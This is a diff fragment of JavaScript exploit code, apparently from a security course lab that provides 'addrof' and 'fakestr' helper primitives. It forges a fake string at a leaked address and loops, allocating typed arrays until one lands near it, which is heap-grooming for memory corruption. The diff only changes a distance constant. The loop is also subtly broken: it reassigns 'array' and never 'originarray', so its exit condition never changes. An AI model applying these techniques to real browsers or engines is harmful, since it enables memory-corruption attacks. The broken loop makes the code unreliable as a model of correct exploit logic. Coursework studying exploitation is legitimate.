@@ -7,7 +7,7 @@ let fakestring = cs361s.fakestr(cs361s.addrof(strfront) + 16);
 
 // Here we are creating arrays for each condition where the address of the string is before of after the array
 let originarray = new Uint32Array(72);
-while (cs361s.addrof(originarray) > cs361s.addrof(fakestring) + 9999944 || cs361s.addrof(originarray) < cs361s.addrof(fakestring)) {
+while (cs361s.addrof(originarray) > cs361s.addrof(fakestring) + 10000000 || cs361s.addrof(originarray) < cs361s.addrof(fakestring)) {
     array = new Uint32Array(72);
 }
 
